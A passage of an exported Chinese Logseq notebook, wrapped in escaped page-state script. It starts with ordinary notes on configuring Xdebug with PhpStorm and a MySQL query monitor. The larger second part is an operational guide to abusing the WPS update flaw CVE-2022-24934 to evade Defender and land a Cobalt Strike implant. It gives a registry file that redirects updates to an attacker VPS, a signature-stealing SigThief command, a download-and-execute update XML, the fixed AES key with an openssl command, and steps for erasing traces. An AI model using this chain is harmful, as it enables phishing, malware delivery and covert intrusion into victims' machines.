lt;br /logseq____&gt;然后也可以发现，确实xdebug模块没有被加载出来，无奈之下，我只好使用7.3.4版本，没想到就成功了：logseq____&lt;br /logseq____&gt;![image.png](https://cdn.nlark.com/yuque/0/2022/png/12414108/1641538104761-efb23a1a-0025-4a87-9768-1b72be4527bd.png#clientId=u16773827-4496-4logseq____&amp;crop=0logseq____&amp;crop=0logseq____&amp;crop=1logseq____&amp;crop=1logseq____&amp;from=pastelogseq____&amp;height=1238logseq____&amp;id=uef42539blogseq____&amp;margin=%5Bobject%20Object%5Dlogseq____&amp;name=image.pnglogseq____&amp;originHeight=1238logseq____&amp;originWidth=1133logseq____&amp;originalType=binarylogseq____&amp;ratio=1logseq____&amp;rotation=0logseq____&amp;showTitle=falselogseq____&amp;size=105222logseq____&amp;status=donelogseq____&amp;style=nonelogseq____&amp;taskId=ud58deab6-9369-41a1-abd3-067d2a9ff4blogseq____&amp;title=logseq____&amp;width=1133)logseq____&lt;br /logseq____&gt;这里给出了应该下载的对应版本。在对应的php.ini的最后添加下面的字段：\\r\\n```\\r\\n[xdebug]\\r\\nzend_extension=\\logseq____&quot;C:\\\\phpstudy_pro\\\\Extensions\\\\php\\\\php7.3.4nts\\\\ext\\\\php_xdebug-3.1.2-7.3-vc15-nts-x86_64.dll\\logseq____&quot;\\r\\nxdebug.mode=\\logseq____&quot;debug\\logseq____&quot;\\r\\nxdebug.output_dir=\\logseq____&quot;C:\\\\phpstudy_pro\\\\tmp\\\\xdebug\\logseq____&quot;\\r\\nxdebug.remote_handler=\\logseq____&quot;dbgp\\logseq____&quot;\\r\\nxdebug.idekey=\\logseq____&quot;PHPSTORM\\logseq____&quot;\\r\\nxdebug.client_host=127.0.0.1\\r\\nxdebug.client_port=9100\\r\\n```\\r\\n不要加中文注释，也会报错的。logseq____&lt;br /logseq____&gt;保存后重启apache服务器，这个模块就被成功加载了：logseq____&lt;br /logseq____&gt;![image.png](https://cdn.nlark.com/yuque/0/2022/png/12414108/1641538232833-245dbfda-704c-4fd5-b9f6-0efa2397f4a0.png#clientId=u16773827-4496-4logseq____&amp;crop=0logseq____&amp;crop=0logseq____&amp;crop=1logseq____&amp;crop=1logseq____&amp;from=pastelogseq____&amp;height=356logseq____&amp;id=u9f6a0595logseq____&amp;margin=%5Bobject%20Object%5Dlogseq____&amp;name=image.pnglogseq____&amp;originHeight=356logseq____&amp;originWidth=404logseq____&amp;originalType=binarylogseq____&amp;ratio=1logseq____&amp;rotation=0logseq____&amp;showTitle=falselogseq____&amp;size=3684logseq____&amp;status=donelogseq____&amp;style=nonelogseq____&amp;taskId=ucd1b1a19-f9b5-496e-9dd9-1413ad40e0alogseq____&amp;title=logseq____&amp;width=404)\\r\\n\\r\\n3. 配置phpstorm\\r\\n\\r\\n[https://blog.51cto.com/u_13640989/2709976](https://blog.51cto.com/u_13640989/2709976)logseq____&lt;br /logseq____&gt;按照上面的教程配置，需要注意：phpstorm最新版本的debug配置是属于PHP目录下的，不在language下了：logseq____&lt;br /logseq____&gt;![image.png](https://cdn.nlark.com/yuque/0/2022/png/12414108/1641538491144-0205ee89-ff6d-4dcc-b079-ad3a1ff64b84.png#clientId=u16773827-4496-4logseq____&amp;crop=0logseq____&amp;crop=0logseq____&amp;crop=1logseq____&amp;crop=1logseq____&amp;from=pastelogseq____&amp;height=228logseq____&amp;id=ufdaa4edalogseq____&amp;margin=%5Bobject%20Object%5Dlogseq____&amp;name=image.pnglogseq____&amp;originHeight=228logseq____&amp;originWidth=225logseq____&amp;originalType=binarylogseq____&amp;ratio=1logseq____&amp;rotation=0logseq____&amp;showTitle=falselogseq____&amp;size=5731logseq____&amp;status=donelogseq____&amp;style=nonelogseq____&amp;taskId=ude76859c-0171-45ac-a878-72fb3b95c26logseq____&amp;title=logseq____&amp;width=225)logseq____&lt;br /logseq____&gt;这里改一下就可以了。logseq____&lt;br /logseq____&gt;![image.png](https://cdn.nlark.com/yuque/0/2022/png/12414108/1641538415699-bd07e43b-1b79-4904-baf5-1e261db5ffcb.png#clientId=u16773827-4496-4logseq____&amp;crop=0logseq____&amp;crop=0logseq____&amp;crop=1logseq____&amp;crop=1logseq____&amp;from=pastelogseq____&amp;height=523logseq____&amp;id=ue8f6a5f1logseq____&amp;margin=%5Bobject%20Object%5Dlogseq____&amp;name=image.pnglogseq____&amp;originHeight=523logseq____&amp;originWidth=580logseq____&amp;originalType=binarylogseq____&amp;ratio=1logseq____&amp;rotation=0logseq____&amp;showTitle=falselogseq____&amp;size=51484logseq____&amp;status=donelogseq____&amp;style=nonelogseq____&amp;taskId=u47bb50e0-39f3-4413-ad92-b87430677bblogseq____&amp;title=logseq____&amp;width=580)logseq____&lt;br /logseq____&gt;出现这样的界面就是成功了。\\r\\n\\r\\n4. 浏览器插件配置\\r\\n\\r\\n因为php的调试需要带有自己的cookie，两种方法可以实现：logseq____&lt;br /logseq____&gt;[https://segmentfault.com/a/1190000018961750](https://segmentfault.com/a/1190000018961750) 提供的，使用debug的方法，无需安装浏览器插件；logseq____&lt;br /logseq____&gt;[https://johnfrod.top/%E5%B7%A5%E5%85%B7/wsl2xdebug3phpstorm%E8%B0%83%E8%AF%95%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/](https://johnfrod.top/%E5%B7%A5%E5%85%B7/wsl2xdebug3phpstorm%E8%B0%83%E8%AF%95%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/)  提供的浏览器插件的方法（个人认为这个更好用）\\r\\n\\r\\n这样一番操作之后，就可以成功的进行PHP的动态调试了！logseq____&lt;br /logseq____&gt;![image.png](https://cdn.nlark.com/yuque/0/2022/png/12414108/1641538703551-a3d3bb3f-288b-4b59-a10f-06534d6b697c.png#clientId=u16773827-4496-4logseq____&amp;crop=0logseq____&amp;crop=0logseq____&amp;crop=1logseq____&amp;crop=1logseq____&amp;from=pastelogseq____&amp;height=858logseq____&amp;id=udd53eeadlogseq____&amp;margin=%5Bobject%20Object%5Dlogseq____&amp;name=image.pnglogseq____&amp;originHeight=858logseq____&amp;originWidth=1443logseq____&amp;originalType=binarylogseq____&amp;ratio=1logseq____&amp;rotation=0logseq____&amp;showTitle=falselogseq____&amp;size=333307logseq____&amp;status=donelogseq____&amp;style=nonelogseq____&amp;taskId=ua19d1e81-329b-4bb1-9e50-1f796e61853logseq____&amp;title=logseq____&amp;width=1443)\\r\\n\\r\\n\\r\\n另外，MYSQLMONITOR也可以用来检测一些运行过程中的sql语句，方便检查出sql注入，配置方法如下：logseq____&lt;br /logseq____&gt;[https://github.com/fupinglee/MySQLMonitor/releases/tag/1.1](https://github.com/fupinglee/MySQLMonitor/releases/tag/1.1)logseq____&lt;br /logseq____&gt;下载jar包后，直接运行打开就好，需要注意，这里需要使用root用户的账号进行登录：logseq____&lt;br /logseq____&gt;![image.png](https://cdn.nlark.com/yuque/0/2022/png/12414108/1641541020588-7d3711e5-48c3-4ecd-8f53-167ac11bce0f.png#clientId=uf81ad7c9-177a-4logseq____&amp;crop=0logseq____&amp;crop=0logseq____&amp;crop=1logseq____&amp;crop=1logseq____&amp;from=pastelogseq____&amp;height=639logseq____&amp;id=u4052f8f3logseq____&amp;margin=%5Bobject%20Object%5Dlogseq____&amp;name=image.pnglogseq____&amp;originHeight=639logseq____&amp;originWidth=1020logseq____&amp;originalType=binarylogseq____&amp;ratio=1logseq____&amp;rotation=0logseq____&amp;showTitle=falselogseq____&amp;size=71397logseq____&amp;status=donelogseq____&amp;style=nonelogseq____&amp;taskId=uba628c3e-6434-4182-b9b6-360dbedcac0logseq____&amp;title=logseq____&amp;width=1020)logseq____&lt;br /logseq____&gt;很方便可以监控到所有的mysql语句了。logseq____&lt;br /logseq____&gt;需要注意，每一次下断点之前都需要连接一下数据库，否则会报错。\\r\\n\\r\\nlogseq____&quot;,536870947]],[logseq____&quot;^15logseq____&quot;,[29,logseq____&quot;^Ologseq____&quot;,logseq____&quot;^16logseq____&quot;,536870947]],[logseq____&quot;^15logseq____&quot;,[29,logseq____&quot;^Flogseq____&quot;,28,536870947]],[logseq____&quot;^15logseq____&quot;,[29,logseq____&quot;^Xlogseq____&quot;,28,536870947]],[logseq____&quot;^15logseq____&quot;,[29,logseq____&quot;^Vlogseq____&quot;,28,536870947]],[logseq____&quot;^15logseq____&quot;,[29,logseq____&quot;^Ulogseq____&quot;,28,536870947]],[logseq____&quot;^15logseq____&quot;,[29,logseq____&quot;^:logseq____&quot;,true,536870947]],[logseq____&quot;^15logseq____&quot;,[29,logseq____&quot;^Jlogseq____&quot;,[],536870947]],[logseq____&quot;^15logseq____&quot;,[29,logseq____&quot;^17logseq____&quot;,true,536870947]],[logseq____&quot;^15logseq____&quot;,[29,logseq____&quot;^;logseq____&quot;,logseq____&quot;~u63ac14ef-8e80-4cf2-8edd-3093f046a7eelogseq____&quot;,536870947]],[logseq____&quot;^15logseq____&quot;,[32,logseq____&quot;^Klogseq____&quot;,1672221935851,536870949]],[logseq____&quot;^15logseq____&quot;,[32,logseq____&quot;^@logseq____&quot;,false,536870949]],[logseq____&quot;^15logseq____&quot;,[32,logseq____&quot;^Ylogseq____&quot;,logseq____&quot;实现junctionpoint的代码（[httpslogseq____&quot;,536870949]],[logseq____&quot;^15logseq____&quot;,[32,logseq____&quot;^11logseq____&quot;,logseq____&quot;实现junctionpoint的代码（[httpslogseq____&quot;,536870949]],[logseq____&quot;^15logseq____&quot;,[32,logseq____&quot;^Blogseq____&quot;,1672221935851,536870949]],[logseq____&quot;^15logseq____&quot;,[32,logseq____&quot;^;logseq____&quot;,logseq____&quot;~u63ac14ef-e039-45ac-9338-44825bb066fdlogseq____&quot;,536870949]],[logseq____&quot;^15logseq____&quot;,[41,logseq____&quot;^Klogseq____&quot;,1672221935919,536870951]],[logseq____&quot;^15logseq____&quot;,[41,logseq____&quot;^@logseq____&quot;,false,536870951]],[logseq____&quot;^15logseq____&quot;,[41,logseq____&quot;^Ylogseq____&quot;,logseq____&quot;使用wpsupdate漏洞实现defender免杀logseq____&quot;,536870951]],[logseq____&quot;^15logseq____&quot;,[41,logseq____&quot;^11logseq____&quot;,logseq____&quot;使用wpsupdate漏洞实现defender免杀logseq____&quot;,536870951]],[logseq____&quot;^15logseq____&quot;,[41,logseq____&quot;^Blogseq____&quot;,1672221935919,536870951]],[logseq____&quot;^15logseq____&quot;,[41,logseq____&quot;^;logseq____&quot;,logseq____&quot;~u63ac14ef-40f1-4379-8c7a-1880c88ff9bclogseq____&quot;,536870951]],[logseq____&quot;^15logseq____&quot;,[42,logseq____&quot;^Qlogseq____&quot;,logseq____&quot;利用wps的相关程序对windows系统进行攻击其实已经出现过一些了，比如利用wps的wpscloudsvr.exe来绕过UAC实现提权/白加黑实现免杀等。这次的CVE-2022-24934也为我们免杀提供了一个新的思路。 \\r\\n\\r\\n利用场景：logseq____&lt;br /logseq____&gt;任意用户，只要是可以用来进行登录的那种， 就可以使用这种方法绕过defender等杀软的动态查杀上线。在只有webshell的情况下，只要不是像iis权限那样低，一般也是可以使用这种方法上线的（已测试）。因此这种方法也会比较适合钓鱼攻击，因为所使用的两个exe文件都是可以通过查杀顺利运行的（使用defender和云沙箱都可以通过）。\\r\\n\\r\\n优势：logseq____&lt;br /logseq____&gt;目前来看，可以通过defender动态查杀的方法并不是很多，而且很多方法都随着defender自己的升级失效了。本次使用的wpsupdate漏洞免杀defender的方法，在短期看是无法通过defender升级解决，且由于这个程序可以独立于wps主程序运行，因此这种方法即使在用户未安装wps的情况下，依然可以顺利上线（当然同样的道理，如果用户已经更新到了比较安全的版本，我们也可以使用投递一个带有漏洞的wpsupdate.exe的方法实现上线）。\\r\\n\\r\\n缺点：logseq____&lt;br /logseq____&gt;使用过程过于复杂，这就是为什么需要写文档来介绍的原因。而且确实由于毕竟还是涉及到了修改注册表的操作，虽然可以用于登录的低权限test用户可以顺利上线，但当只有一个webshell且权限为iis的时候是没办法使用这种方法的。由于会修改注册表，用来投递上线木马的vps可能会暴露在防守人员面前，需要在完成上线操作后尽快恢复正常。\\r\\n\\r\\n使用方法：logseq____&lt;br /logseq____&gt;分为服务器端和客户端，服务器端可以架设在我们控制的vps上，客户端的部分则需要我们使用一些手段投递到受害者的主机上。接下来分别讲一下需要进行的操作：logseq____&lt;br /logseq____&gt;客户端：logseq____&lt;br /logseq____&gt;update.reg：需要修改的两个注册表项，内容如下：\\r\\n```python\\r\\nWindows Registry Editor Version 5.00\\r\\n\\r\\n[HKEY_CURRENT_USER\\\\Software\\\\Kingsoft\\\\Office\\\\6.0\\\\Common]\\r\\n\\logseq____&quot;UpdateSvr\\logseq____&quot;=\\logseq____&quot;http://192.168.1.1/update_config.bin\\logseq____&quot;\\r\\n\\r\\n[HKEY_CURRENT_USER\\\\Software\\\\Kingsoft\\\\Office\\\\6.0\\\\Common\\\\updateinfo]\\r\\n\\logseq____&quot;CheckInterval\\logseq____&quot;=dword:00000000\\r\\n```\\r\\n需要我们自己修改的地方只有上面的“192.168.1.1”的位置，改为受害者机器可以访问到的vps的地址。logseq____&lt;br /logseq____&gt;补充一下，如果想要修改注册表的话，可以把上面的reg文件直接导入到注册表中，也可以使用cmd命令：reg import update.reg来修改，也可以使用exe文件进行修改，这个根据使用场景不同，可以灵活选择。logseq____&lt;br /logseq____&gt;wpsupdate.exe：正常但是有漏洞的wps升级程序，这个不需要任何操作。\\r\\n\\r\\n服务器端：logseq____&lt;br /logseq____&gt;poc.exe：进行静态免杀的上线木马。需要进行的操作是使用SigThief工具将wpsupdate.exe的签名复制到poc.exe中。\\r\\n```python\\r\\npython .\\\\sigthief.py -i .\\\\wpsupdate.exe -t .\\\\poc0.exe -o poc.exe\\r\\n```\\r\\nupdate_config.bin：由xml文件进行默认密钥AES加密生成。想要生成bin文件，首先需要对xml文件进行修改：\\r\\n```python\\r\\nlogseq____&lt;?xml version=\\logseq____&quot;1.0\\logseq____&quot; encoding=\\logseq____&quot;utf-8\\logseq____&quot;?logseq____&gt;\\r\\nlogseq____&lt;update protocol=\\logseq____&quot;1.0\\logseq____&quot;logseq____&gt;\\r\\n    logseq____&lt;actionslogseq____&gt;\\r\\n        logseq____&lt;action id=\\logseq____&quot;download\\logseq____&quot;logseq____&gt;\\r\\n            logseq____&lt;files svr=\\logseq____&quot;http://127.0.0.1\\logseq____&quot; downdir=\\logseq____&quot;%localappdata%\\logseq____&quot;logseq____&gt;\\r\\n                logseq____&lt;file url = \\logseq____&quot;/poc.exe\\logseq____&quot; md5=\\logseq____&quot;c66f25dd442312b30f41bffb2f5bd0d5\\logseq____&quot; size=\\logseq____&quot;25520\\logseq____&quot;/logseq____&gt;\\r\\n            logseq____&lt;/fileslogseq____&gt;\\r\\n        logseq____&lt;/actionlogseq____&gt;\\r\\n        logseq____&lt;action id=\\logseq____&quot;updatesetting\\logseq____&quot;logseq____&gt;\\r\\n            logseq____&lt;infoslogseq____&gt;\\r\\n                logseq____&lt;info id = \\logseq____&quot;1\\logseq____&quot; fun=\\logseq____&quot;execute\\logseq____&quot; param=\\logseq____&quot;JWxvY2FsYXBwZGF0YSVccG9jLmV4ZTtkR1Z6ZEY5d1lYSmhiUT09\\logseq____&quot;/logseq____&gt;\\r\\n            logseq____&lt;/infoslogseq____&gt;\\r\\n        logseq____&lt;/actionlogseq____&gt;\\r\\n    logseq____&lt;/actionslogseq____&gt;\\r\\nlogseq____&lt;/updatelogseq____&gt;\\r\\n```\\r\\n这里需要修改的地方有以下几处，假设我们把文件都默认为poc.exe的话，修改得地方是最少的：logseq____&lt;br /logseq____&gt;svr：需要改成受害者机器可以访问到的vps（不一定要和注册表中的一致，但是需要可以访问到）logseq____&lt;br /logseq____&gt;md5：生成的木马文件的md5值，这里需要注意，一定要等到所有操作都完成（静态免杀、添加数字签名）后再计算md5，同理也需要修改size。logseq____&lt;br /logseq____&gt;md5的计算可使用：certutil -hashfile poc.exe MD5logseq____&lt;br /logseq____&gt;文件大小的计算可以自己计算，也可以使用在线转换网站：[https://www.bejson.com/convert/filesize/](https://www.bejson.com/convert/filesize/)\\r\\n\\r\\n如果文件名不修改的话，就可以开始进行下一步了。但是如果文件名称需要改的话，底下的param就需要修改了，这个字符串是由两次base64 encode生成的，我们需要改的就是第一次base64 decode之后看到的一个文件名，然后直接再encode 一次生成对应param参数即可。logseq____&lt;br /logseq____&gt;xml文件生成bin文件的操作使用openssl完成：\\r\\n```python\\r\\nopenssl enc -aes-128-ecb -nosalt -K 886B1AB6F1FC1D6670EFA2D121039A56 -in update_config.xml -out update_config.bin\\r\\n```\\r\\n这里的key是不变的，只要我们使用这个漏洞进行攻击，就不用改-K后面的参数。logseq____&lt;br /logseq____&gt;两个文件都处理完后，放到一个可以接受post请求的服务器目录下（我这里使用的是HFS这个工具，但是也可以使用其他的）。在客户端运行首先运行注册表导入的exe（也可以使用命令行，都是一样的）修改注册表后，运行wpsupdate，即可等待cs上线。\\r\\n\\r\\n需要注意的是，成功上线的话，需要wpsupdate向我们搭建的服务器请求两个文件：Update_config.bin和poc.exe，如果我们看服务器的日志记录，发现只请求了一个的话，可能就是xml某个地方参数写错了，或者是之前的一次攻击没有清除掉原来落地的文件等原因，需要再排查一下。logseq____&lt;br /logseq____&gt;![image.png](https://cdn.nlark.com/yuque/0/2022/png/12414108/1660532908988-1ae9e84c-e120-4c38-93a8-0608dd00718c.png#clientId=u633f6fa2-6b1b-4logseq____&amp;crop=0logseq____&amp;crop=0logseq____&amp;crop=1logseq____&amp;crop=1logseq____&amp;from=pastelogseq____&amp;height=93logseq____&amp;id=ufc2bdc80logseq____&amp;margin=%5Bobject%20Object%5Dlogseq____&amp;name=image.pnglogseq____&amp;originHeight=93logseq____&amp;originWidth=1266logseq____&amp;originalType=binarylogseq____&amp;ratio=1logseq____&amp;rotation=0logseq____&amp;showTitle=falselogseq____&amp;size=8169logseq____&amp;status=donelogseq____&amp;style=nonelogseq____&amp;taskId=uc16afc0a-21be-4d4e-a4ec-647da14c79blogseq____&amp;title=logseq____&amp;width=1266)\\r\\n\\r\\n清除痕迹：\\r\\n\\r\\n1. 注册表项，参考上面的注册表内容，成功上线后即可恢复原始值（这里给一个参考：[http://update.wps.cn/updateserver/update;http://update2.wps.cn/updateserver/update](http://update.wps.cn/updateserver/update;http://update2.wps.cn/updateserver/update)）。\\r\\n2. 落地的poc文件和注册表文件，注册表文件在修改完注册表后即可删除，poc文件的位置固定在C:\\\\Users\\\\用户名\\\\AppData\\\\Local\\\\poc.exe，需要的话请及时删除，未删除无法进行再次攻击。\\r\\n\\r\\n\\r\\n\\r\\n\\r\\nlogseq____&quot;,536870951]],[logseq____&quot;^15logseq____&quot;,[42,logseq____&quot;^Ologseq____&quot;,logseq____&quot;^16logseq____&quot;,536870951]],[logseq____&quot;^15logseq____&quot;,[42,logseq____&quot;^Flogseq____&quot;,41,536870951]],[logseq____&quot;^15logseq____&quot;,[42,logseq____&quot;^Xlogseq____&quot;,41,536870951]],[logseq____&quot;^15logseq____&quot;,[42,logseq____&quot;^Vlogseq____&quot;,41,536870951]],[logseq____&quot;^15logseq____&quot;,[42,logseq____&quot;^Ulogseq____&quot;,41,536870951]],[logseq____&quot;^15logseq____&quot;,[42,logseq____&quot;^:logseq____&quot;,true,536870951]],[logseq____&quot;^15logseq____&quot;,[42,logseq____&quot;^Jlogseq____&quot;,[],536870951]],[logseq____&quot;^15logseq____&quot;,[42,logseq____&quot;^17logseq____&quot;,true,536870951]],[logseq____&quot;^15logseq____&quot;,[42,logseq____&quot;^;logseq____&quot;,logseq____&quot;~u63ac14ef-3c5d-4881-a560-490e47aaeffdlogseq____&quot;,536870951]],[logseq____&quot;^15logseq____&quot;,[43,logseq____&quot;^Tlogseq____&quot;,logseq____&quot;^Rlogseq____&quot;,536870954]]]]]]"</script><script>window.logseq_state="{:ui/theme \"light\", :ui/sidebar-collapsed-blocks {}, :ui/show-recent? false, :config {\"local\" {:shortcuts {}, :default-templates {:journals \"\"}, :query/views {:pprint (fn [r] [:pre.code (pprint r)])}, :editor/preferred-pasting-file? true, :macros {}, :shortcut/doc-mode-enter-for-new-block? false, :favorites [], :ui/show-empty-bullets? false, :file/name-format :triple-lowbar, :preferred-workflow :now, :publishing/all-pages-public? true, :ref/default-open-blocks-level 2, :feature/enable-block-timestamps? false, :start-of-week 6, :ref/linked-references-collapsed-threshold 50, :outliner/block-title-collapse-enabled? false, :commands [], :meta/version 1, :hidden [], :default-queries {:journals [{:title \"🔨 NOW\", :query [:find (pull ?h [*]) :in $ ?start ?today :where [?h :block/marker ?marker] [(contains? #{\"NOW\" \"DOING\"} ?marker)] [?h :block/page ?p] [?p :block/journal? true] [?p :block/journal-day ?d] [(>= ?d ?start)] [(<= ?d ?today)]], :inputs [:14d :today], :result-transform (fn [result] (sort-by (fn [h] (get h :block/priority \"Z\")) result)), :collapsed? false} {:title \"📅 NEXT\", :query [:find (pull ?h [*]) :in $ ?start ?next :where [?h :block/marker ?marker] [(contains? #{\"NOW\" \"LATER\" \"TODO\"} ?marker)] [?h :block/page ?p] [?p :block/journal? true] [?p :block/journal-day ?d] [(> ?d ?start)] [(< ?d ?next)]], :inputs [:today :7d-after], :collapsed? false}]}, :editor/logical-outdenting? true, :ui/enable-tooltip? true, :query/result-transforms {:sort-by-priority (fn [result] (sort-by (fn [h] (get h :block/priority \"Z\")) result))}, :property-pages/enabled? true, :block/content-max-length 10000, :ui/show-command-doc? true, :feature/enable-search-remove-accents? true}}}"</script><script type="text/javascript">// Single Page Apps for GitHub Pages

      // This script checks to see if a redirect is present in the query string
      // and converts it back into the correct url and adds it to the
      // browser's history using window.history.replaceState(...),
      // which won't cause the browser to attempt to load the new url.
      // When the single page app is loaded further down in this file,
      // the correct url will be waiting in the browser's history for
      // the single page app to route accordingly.
      (function(l) {
        if (l.search) {
          var q = {};
          l.search.slice(1).split('&').forEach(function(v) {
            var a = v.split('=');
            q[a[0]] = a.slice(1).join('=').replace(/~and~/g, '&');
          });
          if (q.p !== undefined) {
            window.history.replaceState(null, null,
              l.pathname.slice(0, -1) + (q.p || '') +
              (q.q ? ('?' + q.q) : '') +
              l.hash
            );
          }
        }
      }(window.location))</script><script src="static/js/main.js"></script><script src="static/js/highlight.min.js"></script><script src="static/js/interact.min.js"></script><script src="static/js/katex.min.js"></script><script src="static/js/code-editor.js"></script></body>
